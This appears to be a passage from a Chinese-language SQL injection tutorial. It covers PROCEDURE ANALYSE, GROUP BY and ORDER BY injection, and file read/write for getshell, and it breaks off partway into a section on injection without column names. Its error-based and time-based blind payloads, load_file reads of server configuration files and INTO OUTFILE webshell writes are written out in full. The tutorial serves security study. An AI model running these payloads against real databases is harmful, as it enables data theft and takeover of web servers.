<p>这里的话是把查询结果导入到文件或者变量，但是INTO除非有写入shell的数据库用户权限，否则是无法利用的，那么可利用的只有PROCEDURE子语句了</p>
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="function"><span class="keyword">PROCEDURE</span> <span class="title">procedure_name</span><span class="params">(argument_list)</span>]</span></span><br></pre></td></tr></table></figure>

<p>然后我们需要知道的是，<strong>MySQL中默认可用的唯一存储过程是ANALYSE</strong>，</p>
<h3 id="ANALYSE-函数"><a href="#ANALYSE-函数" class="headerlink" title="ANALYSE()函数"></a>ANALYSE()函数</h3><p>在 MySQL 中，<code>ANALYSE()</code> 是一个特殊的存储过程，用于分析查询结果的结构和数据分布，并生成优化建议。</p>
<p>语法</p>
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">PROCEDURE</span> <span class="title">ANALYSE</span><span class="params">([max_memory, max_length])</span></span></span><br></pre></td></tr></table></figure>

<p><strong>参数说明</strong>：</p>
<ol>
<li>**<code>max_memory</code>**（第一个参数）：<ul>
<li>指定 <code>PROCEDURE ANALYSE()</code> 在分析过程中可以使用的最大内存（以字节为单位）。</li>
<li>默认值为 <code>256</code>（即 256 字节）。</li>
<li>如果设置为 <code>1</code>，表示使用默认值。</li>
</ul>
</li>
<li>**<code>max_length</code>**（第二个参数）：<ul>
<li>指定 <code>PROCEDURE ANALYSE()</code> 在分析过程中可以使用的最大字符串长度（以字符为单位）。</li>
<li>默认值为 <code>256</code>（即 256 字符）。</li>
<li>如果设置为 <code>1</code>，表示使用默认值。</li>
</ul>
</li>
</ol>
<p>我们本地测一下</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> id &gt; <span class="number">0</span> <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">0</span>,<span class="number">1</span> <span class="keyword">procedure</span> <span class="title function_">analyse</span><span class="params">()</span>;</span><br><span class="line">ERROR <span class="number">1386</span> (HY000): Can<span class="string">&#x27;t use ORDER clause with this procedure</span></span><br><span class="line"><span class="string">mysql&gt; select username from users where id &gt; 0 order by id limit 0,1 procedure analyse(1);</span></span><br><span class="line"><span class="string">ERROR 1386 (HY000): Can&#x27;</span>t use <span class="keyword">ORDER</span> clause <span class="keyword">with</span> this <span class="keyword">procedure</span></span><br></pre></td></tr></table></figure>

<p>ANALYSE可以支持两个参数</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> id &gt; <span class="number">0</span> <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">0</span>,<span class="number">1</span> <span class="keyword">procedure</span> <span class="title function_">analyse</span><span class="params">(1,1)</span>;</span><br><span class="line">ERROR <span class="number">1386</span> (HY000): Can<span class="string">&#x27;t use ORDER clause with this procedure</span></span><br></pre></td></tr></table></figure>

<p>可以看到这里是有报错信息的，我们试一下在其中一个参数中打extractvalue的报错注入</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> id &gt; <span class="number">0</span> <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">0</span>,<span class="number">1</span> <span class="keyword">procedure</span> <span class="title function_">analyse</span><span class="params">(extractvalue(rand()</span>,<span class="title function_">concat</span><span class="params">(0x7e,version()</span>)),1);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~5.1.60-community&#x27;</span></span><br></pre></td></tr></table></figure>

<p>一开始没打出来，后面才发现<code>extractvalue()</code> 函数在 MySQL 5.1 及以上版本中可用，刚好我当时用的是5.0.96</p>
<p>updatexml函数也是可以的</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> id &gt; <span class="number">0</span> <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">0</span>,<span class="number">1</span> <span class="keyword">procedure</span> <span class="title function_">analyse</span><span class="params">(updatexml(1,<span class="keyword">concat</span>(0x7e,version()</span>,0<span class="title function_">x7e</span>),1),1);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~5.1.60-community~&#x27;</span></span><br></pre></td></tr></table></figure>

<p>如果页面不存在回显的话我们又可以怎么做呢？当然是时间盲注了</p>
<p>直接使用sleep不行，需要用BENCHMARK代替。 </p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> id &gt; <span class="number">0</span> <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">0</span>,<span class="number">1</span> <span class="keyword">procedure</span> <span class="title function_">analyse</span><span class="params">((<span class="keyword">select</span> extractvalue(rand()</span>,<span class="title function_">concat</span><span class="params">(0x7e,(<span class="keyword">if</span>(mid(version()</span>,1,1) <span class="title function_">like</span> 2,<span class="title function_">benchmark</span><span class="params">(5000000,sha(1)</span>),1))))),1);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~1&#x27;</span></span><br><span class="line">mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> id &gt; <span class="number">0</span> <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">0</span>,<span class="number">1</span> <span class="keyword">procedure</span> <span class="title function_">analyse</span><span class="params">((<span class="keyword">select</span> extractvalue(rand()</span>,<span class="title function_">concat</span><span class="params">(0x7e,(<span class="keyword">if</span>(mid(version()</span>,1,1) <span class="title function_">like</span> 5,<span class="title function_">benchmark</span><span class="params">(5000000,sha(1)</span>),1))))),1);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~0&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这里成功延迟了，说明我们的判断是对的，所以最终的payload就是</p>
<p>时间盲注</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rocedure analyse((<span class="name">select</span> extractvalue(<span class="name">rand</span>(),concat(<span class="number">0</span>x7e,(<span class="name">if</span>(<span class="name">mid</span>(<span class="name">version</span>(),<span class="number">1</span>,<span class="number">1</span>) like <span class="number">5</span>,benchmark(<span class="number">5000000</span>,sha(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>常规报错注入</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">procedure</span> <span class="title function_">analyse</span><span class="params">(updatexml(1,<span class="keyword">concat</span>(0x7e,version()</span>,0<span class="title function_">x7e</span>),1),1);</span><br></pre></td></tr></table></figure>

<h2 id="7-group-by-注入"><a href="#7-group-by-注入" class="headerlink" title="7.group by 注入"></a>7.group by 注入</h2><h3 id="关于group-by-子语句"><a href="#关于group-by-子语句" class="headerlink" title="关于group by 子语句"></a>关于group by 子语句</h3><p>GROUP BY 语句根据一个或多个列对结果集进行分组。</p>
<p>语法</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, aggregate_function(column2)</span><br><span class="line"><span class="keyword">FROM</span> <span class="built_in">table_name</span></span><br><span class="line"><span class="keyword">WHERE</span> condition</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> column1;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>column1</code>：指定分组的列。</li>
<li><code>aggregate_function(column2)</code>：对分组后的每个组执行的聚合函数。</li>
<li><code>table_name</code>：要查询的表名。</li>
<li><code>condition</code>：可选，用于筛选结果的条件。</li>
</ul>
<p>这里的话group by注入可以打报错注入也可以打时间盲注</p>
<p>上面也讲过了floor报错注入，其实时间盲注 的话就是直接在后面加上if语句就行</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(substr(database()</span></span>,&#123;i&#125;,<span class="number">1</span>)=<span class="string">&#x27;&#123;char&#125;&#x27;</span>,<span class="built_in">sleep</span>(<span class="number">0.05</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h2><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot; <span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> $id <span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p>注入点在 order by 后面的参数中，而 order by 不同于 where 后的注入点，不能使用 union 等注入。</p>
<p>我们看一下官方文档</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; help select;</span><br><span class="line">Name: &#x27;SELECT&#x27;</span><br><span class="line">Description:</span><br><span class="line">Syntax:</span><br><span class="line">SELECT</span><br><span class="line">    [ALL | DISTINCT | DISTINCTROW ]</span><br><span class="line">      [HIGH_PRIORITY]</span><br><span class="line">      [STRAIGHT_JOIN]</span><br><span class="line">      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]</span><br><span class="line">      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]</span><br><span class="line">    select_expr [, select_expr ...]</span><br><span class="line">    [FROM table_references</span><br><span class="line">      [PARTITION partition_list]</span><br><span class="line">    [WHERE where_condition]</span><br><span class="line">    [GROUP BY &#123;col_name | expr | position&#125;</span><br><span class="line">      [ASC | DESC], ... [WITH ROLLUP]]</span><br><span class="line">    [HAVING where_condition]</span><br><span class="line">    [ORDER BY &#123;col_name | expr | position&#125;</span><br><span class="line">      [ASC | DESC], ...]</span><br><span class="line">    [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;]</span><br><span class="line">    [PROCEDURE procedure_name(argument_list)]</span><br><span class="line">    [INTO OUTFILE &#x27;file_name&#x27;</span><br><span class="line">        [CHARACTER SET charset_name]</span><br><span class="line">        export_options</span><br><span class="line">      | INTO DUMPFILE &#x27;file_name&#x27;</span><br><span class="line">      | INTO var_name [, var_name]]</span><br><span class="line">    [FOR UPDATE | LOCK IN SHARE MODE]]</span><br></pre></td></tr></table></figure>

<p>这时候我们可以利用order by 后面的参数进行注入</p>
<ul>
<li>order by 后面的数字可以作为一个注入点，所以我们需要构造一个语句让语句执行结果为数字就行了例如我们构造</li>
</ul>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=left(<span class="built_in">version</span>(),<span class="number">1</span>)</span><br><span class="line">?<span class="built_in">id</span>=right(<span class="built_in">version</span>(),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>此时这两个结果都没有报错且结果都是一样的，测试版本version()&#x3D;5.6.17，说明数字在这并没有作用，那么这时候我们考虑时间盲注和报错注入，去使用布尔类型</p>
<p>此时我们有三种形式</p>
<ol>
<li>直接添加注入语句，?sort&#x3D;(select ***)</li>
<li>利用一些函数。例如 rand() 函数等。 ?sort&#x3D;rand(sql语句)。</li>
<li>利用and，例如 ?sort&#x3D;1 and ( sql语句 )</li>
</ol>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 报错注入示范：</span><br><span class="line">?sort=(select%20count(*)%20from%20information_schema.columns%20group%20by%20concat(0x3a,0x3a,(select%20user()),0x3a,0x3a,floor(rand()*2)))</span><br><span class="line">?sort=(select%20count(*)%20from%20information_schema.columns%20group%20by%20concat(0x3a,0x3a,(select%20user()),0x3a,0x3a,floor(rand(0)*2)))</span><br><span class="line"># 这里尝试 rand(0/1) 构造错误，可以显示 root@loaclhost 用户名</span><br><span class="line"></span><br><span class="line"># 接下来利用rand()示范：</span><br><span class="line">?sort=rand(ascii(left(database(),1))=115) # rand(true) </span><br><span class="line">?sort=rand(ascii(left(database(),1))=116) # rand(false)</span><br><span class="line"># 这里示范出来的payload结果是不同的，可以得知注入是成功的。</span><br><span class="line"></span><br><span class="line"># 延时注入示范：</span><br><span class="line">?sort=1%20and%20IF(ASCII(SUBSTR(database(),1,1))=115,0,sleep(5))</span><br><span class="line">?sort=1%20and%20IF(ASCII(SUBSTR(database(),1,1))=116,0,sleep(5))</span><br><span class="line"># 根据响应时间也可以得知延时注入是成功的。</span><br></pre></td></tr></table></figure>

<ul>
<li>procedure analyse 参数后注入</li>
</ul>
<p>这个在之前limit注入里面说过，但是因为他也是在orderby后面的参数所以也是可以用的</p>
<ul>
<li>将查询结果导入文件</li>
</ul>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">sort</span>=<span class="number">1</span> <span class="keyword">into</span> outfile <span class="string">&quot;/var/www/html/less46.txt&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>利用文件getshell</li>
</ul>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">sort</span>=<span class="number">1</span> <span class="keyword">into</span> outfile <span class="string">&quot;/var/www/html/less46.php&quot;</span> <span class="keyword">lines</span> terminated <span class="keyword">by</span> <span class="number">0x3c3f70687020706870696e666f28293b3f3e</span></span><br></pre></td></tr></table></figure>

<p>3c3f70687020706870696e666f28293b3f3e 是 <code>&lt;php phpinfo();&gt;</code> 的十六进制编码。</p>
<h2 id="8-getshell读写文件"><a href="#8-getshell读写文件" class="headerlink" title="8.getshell读写文件"></a>8.getshell读写文件</h2><p>SQL注入漏洞除了可以对数据库进行数据的查询之外，还可以对的服务器的文件进行读写操作。</p>
<p>前提:</p>
<ul>
<li>存在SQL注入漏洞</li>
<li>web目录具有写入权限</li>
<li>找到网站的绝对路径</li>
<li>secure_file_priv没有具体值（secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。）</li>
</ul>
<p>如何看自己有没有用户权限，我们可以执行user()函数去进行查看</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="function">union <span class="keyword">select</span> <span class="title">user</span>()</span>;</span><br></pre></td></tr></table></figure>

<p>执行version()函数用于获取当前数据库管理系统（DBMS）的版本信息</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="function">union <span class="keyword">select</span> <span class="title">version</span>()</span>;</span><br></pre></td></tr></table></figure>

<p>查询@@version_compile_os可以获取数据库服务器编译时所用操作系统的系统变量。这个变量返回一个表示编译 MySQL 服务器时所用操作系统的字符串。</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="built_in">union</span> <span class="built_in">select</span> <span class="comment">@@</span>version_compile_os</span><br></pre></td></tr></table></figure>

<p>这些是一些基本的信息收集</p>
<p>然后我们先试着去进行读取文件</p>
<p>读取文件load_file()函数</p>
<p><code>LOAD_FILE()</code> 函数是 MySQL 数据库中的一个函数，用于读取服务器上的文件内容。这个函数可以返回指定文件的内容，前提是 MySQL 用户具有访问该文件的权限，并且 MySQL 服务器能够读取该文件。</p>
<p>基础语法</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line"><span class="function"><span class="title">LOAD_FILE</span><span class="params">(file_name)</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>file_name</code>：要读取的文件的完整路径，通常需要用单引号括起来，例如 <code>&#39;C:/path/to/file.txt&#39;</code>。</li>
</ul>
<p>手工注入的写法</p>
<p>语句： select load_file(‘文件路径’)</p>
<p>payload</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="symbol">&#x27;D</span>://flag.txt&#x27;)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>对于sqlmap来说</p>
<p>语句：–file-read 文件路径   从数据库服务器中读取文件</p>
<p>通常我们需要先知道网页根路径是什么样的，可以先读取服务器配置文件</p>
<p>例如是nginx服务器，先读取nginx配置文件</p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="string">&quot;/etc/nginx/nginx.conf&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>然后就是写入文件</p>
<p>union select写入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>() <span class="meta">?&gt;</span><span class="string">&#x27; into outfile &#x27;</span>/tmp/WebShell.php<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>lines terminated by 写入</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">?id=1 into outfile &#x27;/tmp/WebShell.php&#x27; lines terminated by &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>() <span class="meta">?&gt;</span></span><span class="language-xml">&#x27;;</span></span><br><span class="line"><span class="language-xml">原理：通过select语句查询的内容写入文件，也就是 1 into outfile &#x27;/tmp/WebShell.php&#x27; 这样写的原因，然后利用 lines terminated by 语句拼接webshell的内容。lines terminated by 可以理解为 以每行终止的位置添加 xx 内容。</span></span><br></pre></td></tr></table></figure>

<p>lines starting by 写入</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">?id=1 into outfile &#x27;/tmp/WebShell.php&#x27; lines starting by &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>() <span class="meta">?&gt;</span></span><span class="language-xml">&#x27;;</span></span><br><span class="line"><span class="language-xml">#原理：利用 lines starting by 语句拼接webshell的内容。lines starting by 可以理解为 以每行开始的位置添加 xx 内容。</span></span><br></pre></td></tr></table></figure>

<p>fields terminated by 写入</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">?id=1 into outfile &#x27;/tmp/WebShell.php&#x27; fields terminated by &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>() <span class="meta">?&gt;</span></span><span class="language-xml">&#x27;;</span></span><br><span class="line"><span class="language-xml">#利用 fields terminated by 语句拼接webshell的内容。fields terminated by可以理解为以每个字段的位置添加 xx 内容。</span></span><br></pre></td></tr></table></figure>

<h2 id="9-无列名注入"><a href="#9-无列名注入" class="headerlink" title="9.无列名注入"></a>9.无列名注入</h2><p>这是当mysql被waf禁掉information_schema库后的绕过思路</p>
<p>我们先了解一下什么是information_schema库，这个库里面有什么?</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line">+---------------------------------------+</span><br><span class="line">|<span class="string"> Tables_in_information_schema          </span>|</span><br><span class="line">+---------------------------------------+</span><br><span class="line">|<span class="string"> ADMINISTRABLE_ROLE_AUTHORIZATIONS     </span>|</span><br><span class="line">|<span class="string"> APPLICABLE_ROLES                      </span>|</span><br><span class="line">|<span class="string"> CHARACTER_SETS                        </span>|</span><br><span class="line">|<span class="string"> CHECK_CONSTRAINTS                     </span>|</span><br><span class="line">|<span class="string"> COLLATIONS                            </span>|</span><br><span class="line">|<span class="string"> COLLATION_CHARACTER_SET_APPLICABILITY </span>|</span><br><span class="line">|<span class="string"> COLUMNS                               </span>|</span><br><span class="line">|<span class="string"> COLUMNS_EXTENSIONS                    </span>|</span><br><span class="line">|<span class="string"> COLUMN_PRIVILEGES                     </span>|</span><br><span class="line">|<span class="string"> COLUMN_STATISTICS                     </span>|</span><br><span class="line">|<span class="string"> ENABLED_ROLES                         </span>|</span><br><span class="line">|<span class="string"> ENGINES                               </span>|</span><br><span class="line">|<span class="string"> EVENTS                                </span>|</span><br><span class="line">|<span class="string"> FILES                                 </span>|</span><br><span class="line">|<span class="string"> INNODB_BUFFER_PAGE                    </span>|</span><br><span class="line">|<span class="string"> INNODB_BUFFER_PAGE_LRU                </span>|</span><br><span class="line">|<span class="string"> INNODB_BUFFER_POOL_STATS              </span>|</span><br><span class="line">|<span class="string"> INNODB_CACHED_INDEXES                 </span>|</span><br><span class="line">|<span class="string"> INNODB_CMP                            </span>|</span><br><span class="line">|<span class="string"> INNODB_CMPMEM                         </span>|</span><br><span class="line">|<span class="string"> INNODB_CMPMEM_RESET                   </span>|</span><br><span class="line">|<span class="string"> INNODB_CMP_PER_INDEX                  </span>|</span><br><span class="line">|<span class="string"> INNODB_CMP_PER_INDEX_RESET            </span>|</span><br><span class="line">|<span class="string"> INNODB_CMP_RESET                      </span>|</span><br><span class="line">|<span class="string"> INNODB_COLUMNS                        </span>|</span><br><span class="line">|<span class="string"> INNODB_DATAFILES                      </span>|</span><br><span class="line">|<span class="string"> INNODB_FIELDS                         </span>|</span><br><span class="line">|<span class="string"> INNODB_FOREIGN                        </span>|</span><br><span class="line">|<span class="string"> INNODB_FOREIGN_COLS                   </span>|</span><br><span class="line">|<span class="string"> INNODB_FT_BEING_DELETED               </span>|</span><br><span class="line">|<span class="string"> INNODB_FT_CONFIG                      </span>|</span><br><span class="line">|<span class="string"> INNODB_FT_DEFAULT_STOPWORD            </span>|</span><br><span class="line">|<span class="string"> INNODB_FT_DELETED                     </span>|</span><br><span class="line">|<span class="string"> INNODB_FT_INDEX_CACHE                 </span>|</span><br><span class="line">|<span class="string"> INNODB_FT_INDEX_TABLE                 </span>|</span><br><span class="line">|<span class="string"> INNODB_INDEXES                        </span>|</span><br><span class="line">|<span class="string"> INNODB_METRICS                        </span>|</span><br><span class="line">|<span class="string"> INNODB_SESSION_TEMP_TABLESPACES       </span>|</span><br><span class="line">|<span class="string"> INNODB_TABLES                         </span>|</span><br><span class="line">|<span class="string"> INNODB_TABLESPACES                    </span>|</span><br><span class="line">|<span class="string"> INNODB_TABLESPACES_BRIEF              </span>|</span><br><span class="line">|<span class="string"> INNODB_TABLESTATS                     </span>|</span><br><span class="line">|<span class="string"> INNODB_TEMP_TABLE_INFO                </span>|</span><br><span class="line">|<span class="string"> INNODB_TRX                            </span>|</span><br><span class="line">|<span class="string"> INNODB_VIRTUAL                        </span>|</span><br><span class="line">|<span class="string"> KEYWORDS                              </span>|</span><br><span class="line">|<span class="string"> KEY_COLUMN_USAGE                      </span>|</span><br><span class="line">|<span class="string"> OPTIMIZER_TRACE                       </span>|</span><br><span class="line">|<span class="string"> PARAMETERS                            </span>|</span><br><span class="line">|<span class="string"> PARTITIONS                            </span>|</span><br><span class="line">|<span class="string"> PLUGINS                               </span>|</span><br><span class="line">|<span class="string"> PROCESSLIST                           </span>|</span><br><span class="line">|<span class="string"> PROFILING                             </span>|</span><br><span class="line">|<span class="string"> REFERENTIAL_CONSTRAINTS               </span>|</span><br><span class="line">|<span class="string"> RESOURCE_GROUPS                       </span>|</span><br><span class="line">|<span class="string"> ROLE_COLUMN_GRANTS                    </span>|</span><br><span class="line">|<span class="string"> ROLE_ROUTINE_GRANTS                   </span>|</span><br><span class="line">|<span class="string"> ROLE_TABLE_GRANTS                     </span>|</span><br><span class="line">|<span class="string"> ROUTINES                              </span>|</span><br><span class="line">|<span class="string"> SCHEMATA                              </span>|</span><br><span class="line">|<span class="string"> SCHEMATA_EXTENSIONS                   </span>|</span><br><span class="line">|<span class="string"> SCHEMA_PRIVILEGES                     </span>|</span><br><span class="line">|<span class="string"> STATISTICS                            </span>|</span><br><span class="line">|<span class="string"> ST_GEOMETRY_COLUMNS                   </span>|</span><br><span class="line">|<span class="string"> ST_SPATIAL_REFERENCE_SYSTEMS          </span>|</span><br><span class="line">|<span class="string"> ST_UNITS_OF_MEASURE                   </span>|</span><br><span class="line">|<span class="string"> TABLES                                </span>|</span><br><span class="line">|<span class="string"> TABLESPACES                           </span>|</span><br><span class="line">|<span class="string"> TABLESPACES_EXTENSIONS                </span>|</span><br><span class="line">|<span class="string"> TABLES_EXTENSIONS                     </span>|</span><br><span class="line">|<span class="string"> TABLE_CONSTRAINTS                     </span>|</span><br><span class="line">|<span class="string"> TABLE_CONSTRAINTS_EXTENSIONS          </span>|</span><br><span class="line">|<span class="string"> TABLE_PRIVILEGES                      </span>|</span><br><span class="line">|<span class="string"> TRIGGERS                              </span>|</span><br><span class="line">|<span class="string"> USER_ATTRIBUTES                       </span>|</span><br><span class="line">|<span class="string"> USER_PRIVILEGES                       </span>|</span><br><span class="line">|<span class="string"> VIEWS                                 </span>|</span><br><span class="line">|<span class="string"> VIEW_ROUTINE_USAGE                    </span>|</span><br><span class="line">|<span class="string"> VIEW_TABLE_USAGE                      </span>|</span><br><span class="line">+---------------------------------------+</span><br><span class="line">79 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到这个库中的表很多啊，我们只挑平时比较常见的去进行讲解</p>
<p>information_schema库中的表</p>
<p><code>TABLES</code></p>
<ul>
<li><strong>内容</strong>：包含所有数据库中的表的相关信息。</li>
